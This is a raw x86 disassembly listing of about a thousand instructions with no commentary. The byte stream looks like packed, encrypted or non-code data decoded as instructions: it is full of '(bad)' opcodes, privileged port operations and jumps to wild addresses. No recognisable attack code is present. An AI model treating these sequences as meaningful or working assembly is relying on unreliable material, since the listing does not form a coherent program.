  425e4e:	mov    ecx,0x1fe7f72d
  425e53:	push   es
  425e54:	cmp    eax,0xc
  425e57:	adc    BYTE PTR [ecx+0x7d1b6735],bh
  425e5d:	jb     0x425de8
  425e5f:	add    bl,BYTE PTR [ebp+edi*1-0x4c]
  425e63:	fsubr  DWORD PTR [edx+0x3]
  425e66:	test   DWORD PTR [ecx],esp
  425e68:	cmp    ah,BYTE PTR [esp+ebp*1]
  425e6b:	pop    edi
  425e6c:	(bad)  
  425e6d:	lods   al,BYTE PTR ds:[esi]
  425e6e:	out    dx,eax
  425e6f:	shr    BYTE PTR [ebx+0x66900d40],1
  425e75:	cld    
  425e76:	mov    ecx,0x156bbe3e
  425e7b:	cs jge 0x425ec5
  425e7e:	adc    edi,edx
  425e80:	aam    0x99
  425e82:	test   DWORD PTR [ecx+0xba1777a],0x4c4b819c
  425e8c:	xlat   BYTE PTR ds:[ebx]
  425e8d:	pop    ds
  425e8e:	mov    ds:0xba9f2a9e,al
  425e93:	and    esi,DWORD PTR [ecx+0x5e]
  425e96:	aad    0x49
  425e98:	push   ecx
  425e99:	push   0xc5e448c3
  425e9e:	(bad)  
  425e9f:	in     eax,dx
  425ea0:	arpl   WORD PTR [ebx],dx
  425ea2:	jge    0x425e5e
  425ea4:	in     eax,dx
  425ea5:	mov    al,0x77
  425ea7:	sbb    BYTE PTR [ecx+0x1a7bb1a1],cl
  425ead:	in     eax,dx
  425eae:	adc    BYTE PTR [ebx],ch
  425eb0:	inc    esp
  425eb1:	dec    ebx
  425eb2:	mov    dl,0xfd
  425eb4:	inc    ecx
  425eb5:	add    ebp,DWORD PTR [ecx-0x51]
  425eb8:	enter  0x5a39,0xd8
  425ebc:	mov    BYTE PTR [ebx],dh
  425ebe:	adc    eax,0xc7295bed
  425ec4:	add    eax,0xe1e1d0d9
  425ec9:	fsub   QWORD PTR [ebx+0x61]
  425ecc:	or     BYTE PTR [ebp+0x40],dl
  425ecf:	fwait
  425ed0:	jnp    0x425f29
  425ed2:	xlat   BYTE PTR ds:[ebx]
  425ed3:	xchg   esp,eax
  425ed4:	fldenv [ebp+0x3f]
  425ed7:	jb     0x425ed0
  425ed9:	enter  0x97,0x40
  425edd:	sub    BYTE PTR [ecx],bh
  425edf:	cwde   
  425ee0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ee1:	in     eax,dx
  425ee2:	and    edi,0xffffff99
  425ee5:	shl    edi,0x57
  425ee8:	cmp    ah,BYTE PTR [ebp-0x9]
  425eeb:	push   edi
  425eec:	push   es
  425eed:	jle    0x425eaf
  425eef:	push   ss
  425ef0:	adc    al,0x91
  425ef2:	push   es
  425ef3:	(bad)  
  425ef4:	aad    0xf3
  425ef6:	sbb    eax,0x4c9f31ea
  425efb:	fidiv  WORD PTR [edi+0x57440f31]
  425f01:	mov    esp,0x45fe221c
  425f06:	cmp    ecx,DWORD PTR [esi+0x1a]
  425f09:	sub    cl,BYTE PTR [edi+0x360c073a]
  425f0f:	pushf  
  425f10:	dec    ecx
  425f11:	inc    esi
  425f12:	cdq    
  425f13:	mov    bl,BYTE PTR [eax+ebx*1-0xd]
  425f17:	ret    
  425f18:	stc    
  425f19:	push   ebx
  425f1a:	sub    ch,al
  425f1c:	lock out 0x25,al
  425f1f:	and    dl,BYTE PTR [esi]
  425f21:	lods   al,BYTE PTR ds:[esi]
  425f22:	or     BYTE PTR [edx+0xa79b2fe],ah
  425f28:	pushf  
  425f29:	xchg   edi,eax
  425f2a:	fiadd  DWORD PTR [edx+0x6bed]
	...
  425f38:	add    BYTE PTR [eax],al
  425f3a:	or     dl,BYTE PTR [edx-0x3c684]
  425f40:	dec    edi
  425f41:	mov    bl,0x9
  425f43:	sub    al,0x0
  425f45:	sub    esi,edi
  425f47:	fwait
  425f48:	clc    
  425f49:	xchg   DWORD PTR [eax-0x2a],esp
  425f4c:	add    DWORD PTR [eax],eax
  425f4e:	cld    
  425f4f:	add    DWORD PTR [eax],eax
  425f51:	add    BYTE PTR [ebp+0x3c],ch
  425f54:	int    0x7f
  425f56:	out    dx,eax
  425f57:	and    DWORD PTR [esi+0x46],ebx
  425f5a:	xor    BYTE PTR fs:[esi+0x55],bh
  425f5e:	jbe    0x425fa0
  425f60:	outs   dx,DWORD PTR ds:[esi]
  425f61:	dec    esp
  425f62:	push   edx
  425f63:	js     0x425f72
  425f65:	int3   
  425f66:	xchg   esi,eax
  425f67:	ror    DWORD PTR [eax-0x27],1
  425f6a:	pop    ebx
  425f6b:	pop    eax
  425f6c:	fst    QWORD PTR [esi+0x4af42ce1]
  425f72:	retf   0xde3
  425f75:	jns    0x425f60
  425f77:	dec    eax
  425f78:	loope  0x425fcb
  425f7a:	push   cs
  425f7b:	shl    BYTE PTR [ecx+esi*8],0xa
  425f7f:	shr    DWORD PTR [edx-0x6b],1
  425f82:	fisttp DWORD PTR [esi]
  425f84:	or     al,0x44
  425f86:	and    BYTE PTR [ebp-0x22],0xf1
  425f8a:	pop    ebp
  425f8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425f8c:	(bad)  
  425f8d:	fdiv   st(6),st
  425f8f:	cmp    esi,esp
  425f91:	ror    BYTE PTR [edx+0x4f],0xd1
  425f95:	lahf   
  425f96:	(bad)  
  425f97:	mov    eax,0x9688e507
  425f9c:	and    ah,BYTE PTR [ecx]
  425f9e:	adc    BYTE PTR [edx+0x40efb66c],bh
  425fa4:	cmp    bl,BYTE PTR [edx-0x60]
  425fa7:	call   0x5081:0x7cbbc18e
  425fae:	lahf   
  425faf:	or     eax,0x5eacdf7d
  425fb4:	xor    ch,BYTE PTR [ecx+0x199f98f1]
  425fba:	sbb    BYTE PTR [ebp+0x17],0xf7
  425fbe:	ins    BYTE PTR es:[edi],dx
  425fbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425fc0:	(bad)  
  425fc1:	in     eax,0x96
  425fc3:	xchg   edi,eax
  425fc4:	xor    BYTE PTR [ebx+0x23dd7dc6],dl
  425fca:	push   0xc1fb6741
  425fcf:	inc    eax
  425fd0:	jne    0x425fcf
  425fd2:	mov    bh,0xde
  425fd4:	cmp    edx,DWORD PTR [ebx]
  425fd6:	inc    edx
  425fd7:	xchg   edx,eax
  425fd8:	mov    dh,0x29
  425fda:	add    eax,0x672a5ef2
  425fdf:	call   0x54099ba3
  425fe4:	cld    
  425fe5:	arpl   WORD PTR [esi],si
  425fe7:	aad    0x30
  425fe9:	xor    esi,DWORD PTR [ecx]
  425feb:	mov    al,0xc5
  425fed:	sbb    al,0xea
  425fef:	ret    
  425ff0:	sub    al,0xe3
  425ff2:	xchg   DWORD PTR [eax],edi
  425ff4:	ja     0x42600f
  425ff6:	adc    esi,DWORD PTR [bp+0x1c56]
  425ffb:	add    ah,ch
  425ffd:	ins    DWORD PTR es:[edi],dx
  425ffe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425fff:	xor    ecx,DWORD PTR [ecx]
  426001:	(bad)  
  426002:	sub    edx,DWORD PTR [esi]
  426004:	in     eax,0x40
  426006:	ret    0xd24
  426009:	int3   
  42600a:	repnz push ebp
  42600c:	scas   eax,DWORD PTR es:[edi]
  42600d:	or     eax,0x6f5fbf77
  426012:	retf   
  426013:	(bad)  
  426014:	cmp    BYTE PTR [ecx],dh
  426016:	mov    BYTE PTR [edx-0x3fe749a1],al
  42601c:	sub    dl,BYTE PTR [bx+si+0x7e6c]
  426021:	test   BYTE PTR [ebp+0x65],bh
  426024:	cmp    ebp,ebx
  426026:	test   al,0xc3
  426028:	fwait
  426029:	inc    eax
  42602a:	hlt    
  42602b:	js     0x426090
  42602d:	(bad)  
  42602e:	loope  0x425fc2
  426030:	call   0xa55af11b
  426035:	xchg   edi,eax
  426036:	(bad)  
  426038:	inc    esp
  426039:	mov    ds:0x34285a0f,eax
  42603e:	pop    ss
  42603f:	add    al,BYTE PTR [edx+eiz*1]
  426042:	sub    ebx,ebx
  426044:	loop   0x426095
  426046:	scas   eax,DWORD PTR es:[edi]
  426047:	fidiv  DWORD PTR [esi+0x95c47a]
  42604d:	jl     0x425fdb
  42604f:	call   0x544ed0c9
  426054:	mov    cs,WORD PTR [ecx+0x63]
  426057:	jle    0x426045
  426059:	scas   eax,DWORD PTR es:[edi]
  42605a:	imul   edx,DWORD PTR [edi+0x65],0xffffff86
  42605e:	jmp    0x42606a
  426060:	daa    
  426061:	cmp    al,0x10
  426063:	xlat   BYTE PTR ds:[ebx]
  426064:	jnp    0x426055
  426066:	cmc    
  426067:	stos   BYTE PTR es:[edi],al
  426068:	jmp    0xdcb3e46c
  42606d:	aas    
  42606e:	jle    0x426017
  426070:	lock out dx,al
  426072:	inc    eax
  426073:	scas   eax,DWORD PTR es:[edi]
  426074:	dec    eax
  426075:	fcomp  QWORD PTR [ecx+0x278b1be2]
  42607b:	jp     0x42608d
  42607d:	pop    ebx
  42607e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42607f:	mov    ch,0x53
  426081:	pop    ebp
  426082:	in     al,dx
  426083:	imul   ecx,esp,0x36
  426086:	icebp  
  426087:	addr16 jl 0x426049
  42608a:	inc    eax
  42608b:	adc    al,0x18
  42608d:	pop    eax
  42608e:	sub    dh,BYTE PTR [esi]
  426090:	and    eax,0xf3f8e2f3
  426095:	xlat   BYTE PTR ds:[ebx]
  426096:	imul   ebx,DWORD PTR [eiz*1-0x69e0ed77],0xc555ee91
  4260a1:	inc    eax
  4260a2:	mul    DWORD PTR [edi+0x3fa2be4c]
  4260a8:	and    BYTE PTR [edi+0x6a8df58a],0x17
  4260af:	and    cl,BYTE PTR [ebp+eiz*8+0x39]
  4260b3:	jmp    0x66070906
  4260b8:	xor    BYTE PTR [ebp+0x6f],ch
  4260bb:	test   al,0x5c
  4260bd:	mov    cl,0x7f
  4260bf:	test   eax,0x9b4e2ae5
  4260c4:	jge    0x426080
  4260c6:	xchg   DWORD PTR [edi+0x379e1ef0],esi
  4260cc:	cmp    eax,DWORD PTR [edx-0x3f]
  4260cf:	mov    ebx,0x575bf8e7
  4260d4:	(bad)  
  4260d5:	test   al,0x9f
  4260d7:	out    0x2e,al
  4260d9:	out    dx,eax
  4260da:	sub    eax,0xd0a22c19
  4260df:	sahf   
  4260e0:	shl    dh,0xc
  4260e3:	dec    ebp
  4260e4:	xchg   DWORD PTR [edi-0xaa576bc],ecx
  4260ea:	dec    esp
  4260eb:	push   edx
  4260ec:	sahf   
  4260ed:	scas   al,BYTE PTR es:[edi]
  4260ee:	scas   eax,DWORD PTR es:[edi]
  4260ef:	jno    0x42610e
  4260f1:	and    eax,0x1eff76c8
  4260f6:	mov    edx,0x5faab304
  4260fb:	inc    ebp
  4260fc:	(bad)
  426100:	clc    
  426101:	jge    0x4260f6
  426103:	inc    eax
  426104:	mov    edi,0x3b7d720c
  426109:	jmp    0x879b3939
  42610e:	xchg   DWORD PTR [ebp-0x58246a95],eax
  426114:	push   ebp
  426115:	pop    ss
  426116:	mov    ?,WORD PTR [ebx-0x3b]
  426119:	leave  
  42611a:	sahf   
  42611b:	int    0x94
  42611d:	mov    WORD PTR [esi+0x56d285f0],ds
  426123:	mov    edi,ecx
  426125:	test   al,0x46
  426127:	push   ss
  426128:	xchg   esp,eax
  426129:	cmp    eax,0xa2f4c847
  42612e:	adc    BYTE PTR [eax-0x11],0xb8
  426132:	(bad)  [ebp-0x2c]
  426135:	mov    dh,0xca
  426137:	clc    
  426138:	inc    ecx
  426139:	pop    es
  42613a:	iret   
  42613b:	push   ds
  42613c:	pushf  
  42613d:	push   ss
  42613e:	in     al,dx
  42613f:	aad    0x20
  426141:	xor    ah,BYTE PTR [eax-0x29]
  426144:	xchg   ebp,eax
  426145:	lea    ebp,[edi-0x5067d8b7]
  42614b:	loope  0x426133
  42614d:	sub    al,BYTE PTR [eax]
	...
  426157:	add    BYTE PTR [eax],al
  426159:	add    bl,al
  42615b:	and    ecx,edx
  42615d:	dec    eax
  42615e:	repz clc 
  426160:	fld    TBYTE PTR [ebx-0x2cd29d30]
  426166:	xor    al,0xe
  426168:	in     eax,0x82
  42616a:	pop    esp
  42616b:	fadd   DWORD PTR [ecx]
  42616d:	add    ah,bh
  42616f:	add    DWORD PTR [eax],eax
  426171:	add    BYTE PTR [ebx-0x78c997e8],cl
  426177:	mov    cl,dl
  426179:	stos   DWORD PTR es:[edi],eax
  42617a:	push   es
  42617b:	xchg   ebp,eax
  42617c:	fnstenv [ecx+esi*2]
  42617f:	cs mov esp,0x843fdcc2
  426185:	mov    esi,0xa61459b8
  42618a:	push   es
  42618b:	loop   0x42617f
  42618d:	and    ah,BYTE PTR [eax+0x3b]
  426190:	sbb    DWORD PTR [edi],edi
  426192:	test   al,0xcb
  426194:	jne    0x426159
  426196:	jmp    0x45dc:0xa3400129
  42619d:	push   eax
  42619e:	data16 test BYTE PTR [esi],0x8e
  4261a2:	leave  
  4261a3:	lods   al,BYTE PTR ds:[esi]
  4261a4:	add    ecx,DWORD PTR [eax]
  4261a6:	inc    esi
  4261a7:	xor    ecx,DWORD PTR [edx]
  4261a9:	inc    esi
  4261aa:	jmp    0x4261ff
  4261ac:	jbe    0x426153
  4261ae:	nop
  4261af:	ins    DWORD PTR es:[edi],dx
  4261b0:	stos   DWORD PTR es:[edi],eax
  4261b1:	jnp    0x426146
  4261b3:	popa   
  4261b4:	cld    
  4261b5:	add    DWORD PTR [ecx-0x7d1756cc],ecx
  4261bb:	xchg   edi,eax
  4261bc:	retf   0x563c
  4261bf:	in     al,dx
  4261c0:	stos   BYTE PTR es:[edi],al
  4261c1:	adc    al,0xf1
  4261c3:	jmp    0x42622e
  4261c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261c6:	sahf   
  4261c7:	jae    0x426159
  4261c9:	scas   al,BYTE PTR es:[edi]
  4261ca:	dec    esi
  4261cb:	adc    al,0xca
  4261cd:	rcr    BYTE PTR [esi-0x3],cl
  4261d0:	cmp    ah,BYTE PTR [eax+0x0]
  4261d3:	mov    DWORD PTR [edx+esi*4-0x7a202c3b],edx
  4261da:	leave  
  4261db:	mov    dh,0xa
  4261dd:	int3   
  4261de:	mov    eax,0x10f459a9
  4261e3:	mov    ah,BYTE PTR [eax]
  4261e5:	jno    0x4261cb
  4261e7:	lea    ebx,[ecx-0x511e481a]
  4261ed:	cmc    
  4261ee:	aam    0xfe
  4261f0:	mov    BYTE PTR [eax+0x75ec2191],bh
  4261f6:	pop    ebx
  4261f7:	out    dx,eax
  4261f8:	cmp    ebp,esp
  4261fa:	addr16 jno 0x42625c
  4261fd:	and    eax,0x22f921d
  426202:	fmul   st(2),st
  426204:	and    al,0xa8
  426206:	inc    edx
  426207:	(bad)  
  426208:	mov    ecx,0x92d9c858
  42620d:	pop    es
  42620e:	adc    DWORD PTR [ecx+ebx*4],edi
  426211:	adc    al,0x62
  426213:	pusha  
  426214:	(bad)  [esp+eax*1+0x6a3384a6]
  42621b:	ret    
  42621c:	popf   
  42621d:	pop    ss
  42621e:	pushf  
  42621f:	(bad)  
  426220:	sub    bh,BYTE PTR [edi]
  426222:	inc    ecx
  426223:	push   0xffffffaa
  426225:	aad    0x33
  426227:	cmp    ebx,0xfffffff7
  42622a:	mov    edx,0xa94b4f30
  42622f:	push   0x7d62810c
  426234:	into   
  426235:	ins    BYTE PTR es:[edi],dx
  426236:	jmp    0x91ad2b52
  42623b:	jae    0x42625b
  42623d:	push   cs
  42623e:	pop    esi
  42623f:	mov    ah,BYTE PTR [esi]
  426241:	sar    BYTE PTR [ecx+0x79],cl
  426244:	adc    BYTE PTR ds:0x3376ec6,0x5c
  42624b:	loopne 0x426231
  42624d:	cmp    BYTE PTR [ecx+0x7b],ah
  426250:	dec    edx
  426251:	and    eax,0x600a51d2
  426256:	sub    ecx,DWORD PTR [esi-0x632f4ec2]
  42625c:	clc    
  42625d:	ins    BYTE PTR es:[edi],dx
  42625e:	daa    
  42625f:	repz popa 
  426261:	xor    BYTE PTR [ecx],cl
  426263:	mov    ecx,0x20fe100c
  426268:	js     0x42629f
  42626a:	aam    0x81
  42626c:	fdivr  st(1),st
  42626e:	xor    eax,DWORD PTR [eax+ecx*1+0x41d59445]
  426275:	inc    esp
  426276:	popa   
  426277:	je     0x42627c
  426279:	rol    cl,0x27
  42627c:	xchg   BYTE PTR [edi-0xf],cl
  42627f:	fsub   st,st(6)
  426281:	bound  esp,QWORD PTR [edx]
  426283:	pop    ecx
  426284:	inc    edx
  426285:	in     al,dx
  426286:	fnstsw WORD PTR [ebx-0x7f57ba2e]
  42628c:	xlat   BYTE PTR ds:[ebx]
  42628d:	or     ebx,DWORD PTR [edx+ecx*8-0x7f]
  426291:	mov    ah,0xd2
  426293:	rcr    BYTE PTR [ecx-0x70],1
  426296:	jmp    0xd2a8e6d3
  42629b:	adc    DWORD PTR ds:[esi+edi*1+0x25e18f61],0xffffff84
  4262a4:	jmp    0x426268
  4262a6:	push   esi
  4262a7:	push   esi
  4262a8:	imul   ebp,ecx,0xcfdfee00
  4262ae:	mov    al,ds:0xa7ca9cf8
  4262b3:	fxch   st(0)
  4262b5:	add    eax,0xbe5ca480
  4262ba:	test   BYTE PTR [esi],al
  4262bc:	mov    dh,0x3e
  4262be:	retf   0xff7b
  4262c1:	ror    esi,1
  4262c3:	mov    dh,0xc
  4262c5:	push   ds
  4262c6:	(bad)  
  4262c7:	stos   DWORD PTR es:[edi],eax
  4262c8:	cwde   
  4262c9:	mov    eax,ds:0x875e2119
  4262ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4262cf:	push   edi
  4262d0:	out    dx,al
  4262d1:	or     ah,bl
  4262d3:	or     BYTE PTR [ebp-0x680a9c3a],0xf6
  4262da:	frstor [edi+0x3f]
  4262dd:	push   esp
  4262de:	imul   edi,eax,0xffffffe3
  4262e1:	fstp   TBYTE PTR [edi+0x59]
  4262e4:	and    edi,0xd169c88f
  4262ea:	mov    BYTE PTR [esi-0x5945a588],al
  4262f0:	and    DWORD PTR [esi+0x8],0xfffffff3
  4262f4:	outs   dx,BYTE PTR ds:[esi]
  4262f5:	fimul  WORD PTR [eax+edx*4]
  4262f8:	mov    ch,0xef
  4262fa:	ja     0x42636c
  4262fc:	or     eax,0x13ed76cd
  426301:	loope  0x426339
  426303:	and    al,0xd8
  426305:	adc    al,0xa1
  426307:	xchg   ecx,eax
  426308:	sbb    eax,0x659d4787
  42630d:	push   eax
  42630e:	xor    eax,0x181f8737
  426313:	fcomi  st,st(2)
  426315:	and    ebp,0xfffffff5
  426318:	inc    eax
  426319:	xchg   edx,eax
  42631a:	mov    eax,ds:0x173217de
  42631f:	scas   al,BYTE PTR es:[edi]
  426320:	(bad)  
  426321:	repz jns 0x4262d4
  426324:	xchg   BYTE PTR [ecx+edx*1-0x79a42b7a],ah
  42632b:	enter  0xe1a8,0x9a
  42632f:	pop    ecx
  426330:	test   DWORD PTR [edx-0x39e5cfa6],ebp
  426336:	add    ch,cl
  426338:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426339:	xchg   ebx,eax
  42633a:	loope  0x4262c9
  42633c:	adc    BYTE PTR [esi],cl
  42633e:	adc    eax,esi
  426340:	sbb    esi,DWORD PTR [edx+0x30]
  426343:	or     eax,0x855aaf1c
  426348:	addr16 cmc 
  42634a:	hlt    
  42634b:	adc    esp,0xb4c09149
  426351:	mov    ds:0xb90d61fe,eax
  426356:	add    DWORD PTR [eax+0x64],eax
  426359:	je     0x42637f
  42635b:	jg     0x42638f
  42635d:	test   eax,0x42d5a2ec
  426362:	not    DWORD PTR [ecx+ebp*4+0x2d2a8f5c]
  426369:	xor    BYTE PTR [ecx+0x35e882],dl
	...
  426377:	add    BYTE PTR [eax],al
  426379:	add    BYTE PTR [edx-0x101610a7],bl
  42637f:	call   FWORD PTR [esi-0x71a9f385]
  426385:	sar    DWORD PTR [esi],cl
  426387:	jnp    0x4263b2
  426389:	ins    DWORD PTR es:[edi],dx
  42638a:	pop    eax
  42638b:	fiadd  DWORD PTR [ecx]
  42638d:	add    ah,bh
  42638f:	add    DWORD PTR [eax],eax
  426391:	add    bl,ch
  426393:	scas   al,BYTE PTR es:[edi]
  426394:	mov    eax,0x2461e16f
  426399:	jne    0x42636e
  42639b:	scas   al,BYTE PTR es:[edi]
  42639c:	ss mov edi,0x8ae16b6d
  4263a2:	pop    ds
  4263a3:	bound  edx,QWORD PTR [ecx+0x78]
  4263a6:	mov    ch,0x52
  4263a8:	adc    DWORD PTR [edi-0x67b52f16],ebp
  4263ae:	stc    
  4263af:	int3   
  4263b0:	lock dec edi
  4263b2:	sbb    al,0xd8
  4263b4:	dec    eax
  4263b5:	(bad)  
  4263b6:	(bad)  
  4263b7:	(bad)  
  4263b8:	sbb    al,BYTE PTR ds:0x42e4a51b
  4263be:	(bad)  
  4263bf:	cmp    BYTE PTR [eax-0x24],al
  4263c2:	ins    BYTE PTR es:[edi],dx
  4263c3:	mov    esp,0x4b58261c
  4263c8:	add    DWORD PTR [edi+0x230935b6],0xffffffdf
  4263cf:	clc    
  4263d0:	outs   dx,DWORD PTR ds:[esi]
  4263d1:	jl     0x4263c7
  4263d3:	xor    BYTE PTR [esi+0x24],cl
  4263d6:	ins    DWORD PTR es:[edi],dx
  4263d7:	mov    ah,0x97
  4263d9:	scas   eax,DWORD PTR es:[edi]
  4263da:	loopne 0x426394
  4263dc:	aaa    
  4263dd:	cmp    bl,BYTE PTR [ecx-0x5]
  4263e0:	test   eax,0xee7e3e96
  4263e5:	add    BYTE PTR [edi],dl
  4263e7:	push   ecx
  4263e8:	and    bl,al
  4263ea:	fisub  DWORD PTR [ecx*4-0x719f47cb]
  4263f1:	shr    BYTE PTR [ebx+0x6a],0x82
  4263f5:	sub    eax,0x4442879c
  4263fa:	push   ds
  4263fb:	push   ecx
  4263fc:	test   esi,ebx
  4263fe:	fadd   st(3),st
  426400:	loopne 0x42643c
  426402:	out    dx,al
  426403:	imul   eax,DWORD PTR [eax],0xffffff9e
  426406:	jno    0x4263f2
  426408:	stc    
  426409:	push   0xfffffff9
  42640b:	pop    es
  42640c:	sbb    BYTE PTR [edi+0x7424a95e],dh
  426412:	push   eax
  426413:	sub    al,0xda
  426415:	jmp    0x426415
  426417:	bnd jnp 0x426494
  42641a:	xchg   ecx,eax
  42641b:	push   ebp
  42641c:	pop    ss
  42641d:	sbb    DWORD PTR [ebp-0x6c],eax
  426420:	ins    DWORD PTR es:[edi],dx
  426421:	xor    ch,bh
  426423:	and    BYTE PTR [eax+0x52fa2f57],ch
  426429:	jo     0x42647b
  42642b:	fcmovnbe st,st(6)
  42642d:	dec    bp
  42642f:	jl     0x4263e7
  426431:	sub    al,0x5f
  426433:	test   eax,0x2ceaebe2
  426438:	pop    esp
  426439:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42643a:	jg     0x4263fe
  42643c:	sub    al,0x90
  42643e:	add    eax,0x22ed7ad5
  426443:	inc    edi
  426444:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426445:	jnp    0x426481
  426447:	pop    es
  426448:	lock ds mov ebp,0x77448d28
  42644f:	cli    
  426450:	ja     0x4264c9
  426452:	addr16 mov dh,0xfd
  426455:	ja     0x4264aa
  426457:	adc    BYTE PTR [ebx],ch
  426459:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42645a:	jmp    FWORD PTR [edx-0x65]
  42645d:	mov    ecx,0x6460d60a
  426462:	adc    eax,0x2923ffd6
  426467:	fs cmc 
  426469:	outs   dx,DWORD PTR ds:[esi]
  42646a:	mov    esp,0x8d76c96
  42646f:	pop    edi
  426470:	pop    ss
  426471:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426472:	int3   
  426473:	cmp    cl,BYTE PTR [ecx+0x34fca38f]
  426479:	es jl  0x4264f4
  42647c:	icebp  
  42647d:	push   esi
  42647e:	stos   DWORD PTR es:[edi],eax
  42647f:	(bad)  
  426480:	jmp    0x4264d4
  426482:	lods   eax,DWORD PTR ds:[esi]
  426483:	leave  
  426484:	push   es
  426485:	mov    ebp,0xecd3e11c
  42648a:	lods   eax,DWORD PTR ds:[esi]
  42648b:	pop    edi
  42648c:	mov    DWORD PTR [ebp+0x6460a382],esi
  426492:	add    eax,0xa43063a7
  426497:	push   cs
  426498:	adc    ecx,DWORD PTR [edx-0x3a]
  42649b:	push   ebx
  42649c:	out    dx,eax
  42649d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42649e:	(bad)  
  42649f:	hlt    
  4264a0:	stc    
  4264a1:	and    esi,DWORD PTR [ebp+0x55]
  4264a4:	inc    eax
  4264a5:	mov    ?,WORD PTR [ebx-0x36620964]
  4264ab:	std    
  4264ac:	scas   al,BYTE PTR es:[edi]
  4264ad:	aad    0x2
  4264af:	add    eax,0x3cc46cd6
  4264b4:	test   al,0x84
  4264b6:	sbb    ch,bh
  4264b8:	inc    esi
  4264b9:	jbe    0x42652d
  4264bb:	dec    esp
  4264bc:	rcl    bl,1
  4264be:	add    BYTE PTR [ebp+0x4e],bl
  4264c1:	pop    ebp
  4264c2:	jmp    0x479340bb
  4264c7:	addr16 test eax,0x39b750d0
  4264cd:	or     BYTE PTR [eax],bh
  4264cf:	mov    ds:0x9ade9729,eax
  4264d4:	mov    dl,0x9e
  4264d6:	out    0x4,al
  4264d8:	jne    0x426531
  4264da:	dec    ecx
  4264db:	aad    0x57
  4264dd:	ficom  DWORD PTR [ecx]
  4264df:	div    BYTE PTR [ebx-0x33]
  4264e2:	or     al,0xdd
  4264e4:	or     DWORD PTR [esi-0x1],esp
  4264e7:	fstp   QWORD PTR [edi]
  4264e9:	cdq    
  4264ea:	and    esi,DWORD PTR [eax+0x7f]
  4264ed:	aaa    
  4264ee:	inc    edx
  4264ef:	sbb    al,0xf4
  4264f1:	jmp    0x42648f
  4264f3:	sub    DWORD PTR [ebp+0x193fbd0a],0xffffffe6
  4264fa:	test   BYTE PTR [eax+0x2de7292a],al
  426500:	mov    ds:0x45665ddf,al
  426505:	shl    BYTE PTR [ecx-0x2445eb96],0x9f
  42650c:	jo     0x426491
  42650e:	pop    edi
  42650f:	int3   
  426510:	xchg   ecx,eax
  426511:	in     eax,dx
  426512:	mov    edi,0x187ac286
  426517:	or     DWORD PTR [ebp+0xb856cb0],esp
  42651d:	push   ebx
  42651e:	mov    ah,0x24
  426520:	and    BYTE PTR [edi+0x401de5bd],bh
  426526:	mov    ds:0x260474b5,eax
  42652b:	jmp    0x7eb69d1e
  426530:	xor    DWORD PTR fs:[edx],eax
  426533:	stos   DWORD PTR es:[edi],eax
  426534:	jnp    0x426531
  426536:	ins    BYTE PTR es:[edi],dx
  426537:	xchg   edi,eax
  426538:	aam    0xb3
  42653a:	inc    edx
  42653b:	adc    cl,BYTE PTR [esi+edx*4-0x31]
  42653f:	pop    ds
  426540:	sub    DWORD PTR [ebx+0x4570cadb],esi
  426546:	xor    eax,0x30122b09
  42654b:	jae    0x426515
  42654d:	lea    ebp,[edx+0x7f]
  426550:	dec    ebx
  426551:	mov    bl,0xe3
  426553:	dec    ebp
  426554:	in     eax,dx
  426555:	add    DWORD PTR [ebx],esp
  426557:	pusha  
  426558:	loopne 0x426565
  42655a:	sahf   
  42655b:	retf   
  42655c:	jne    0x42652a
  42655e:	mov    ah,0xcb
  426560:	inc    eax
  426561:	inc    edi
  426562:	mov    eax,0x994e0ec9
  426567:	jnp    0x426585
  426569:	push   edx
  42656a:	icebp  
  42656b:	push   esp
  42656c:	mov    ecx,0x967b929f
  426571:	hlt    
  426572:	es out dx,al
  426574:	xor    eax,0xa6a04de
  426579:	push   ebp
  42657a:	mov    eax,ds:0x64acabee
  42657f:	sbb    DWORD PTR [ebp+ebp*2-0x1b5bc34b],ebx
  426586:	pusha  
  426587:	jge    0x426566
  426589:	push   eax
  42658a:	mov    dl,BYTE PTR [edi]
  42658c:	inc    eax
  42658d:	mov    eax,DWORD PTR [eax]
	...
  426597:	add    BYTE PTR [eax],al
  426599:	add    BYTE PTR [ebp+0x4f3707c0],cl
  42659f:	idiv   DWORD PTR [ebp-0x7c857b06]
  4265a5:	jg     0x42655e
  4265a7:	repz call 0x21eba9c
  4265ad:	add    ah,bh
  4265af:	add    DWORD PTR [eax],eax
  4265b1:	add    BYTE PTR [edi+0x7b6aee07],ah
  4265b7:	mov    ah,0x3b
  4265b9:	jne    0x4265f8
  4265bb:	xor    edi,ebx
  4265bd:	mov    cl,0xb3
  4265bf:	jbe    0x426576
  4265c1:	fadd   DWORD PTR [eax]
  4265c3:	and    cl,ah
  4265c5:	jmp    0x42662a
  4265c7:	mov    ss,ecx
  4265c9:	fbstp  TBYTE PTR [edx-0x5a]
  4265cc:	outs   dx,DWORD PTR ds:[esi]
  4265cd:	sar    DWORD PTR [edi-0x336a83e5],1
  4265d3:	sub    BYTE PTR [eiz*4-0x2128219b],ch
  4265da:	(bad)  
  4265db:	icebp  
  4265dc:	mul    BYTE PTR ds:0x13de3257
  4265e2:	ins    BYTE PTR es:[edi],dx
  4265e3:	aas    
  4265e4:	mov    cl,0x65
  4265e6:	push   0x3e
  4265e8:	or     DWORD PTR [eax-0x6f551fea],ebp
  4265ee:	out    0x87,al
  4265f0:	scas   eax,DWORD PTR es:[edi]
  4265f1:	adc    BYTE PTR [esi+0x46d66967],0x3c
  4265f8:	jmp    0x70533781
  4265fd:	fild   WORD PTR [edi]
  4265ff:	daa    
  426600:	and    BYTE PTR [ebx-0x33],bl
  426603:	aas    
  426604:	jae    0x4265fc
  426606:	pop    ebp
  426607:	jmp    0x42663f
  426609:	nop
  42660a:	mov    ebx,0xdf536a5
  42660f:	shl    DWORD PTR [esi+0x5f9caced],cl
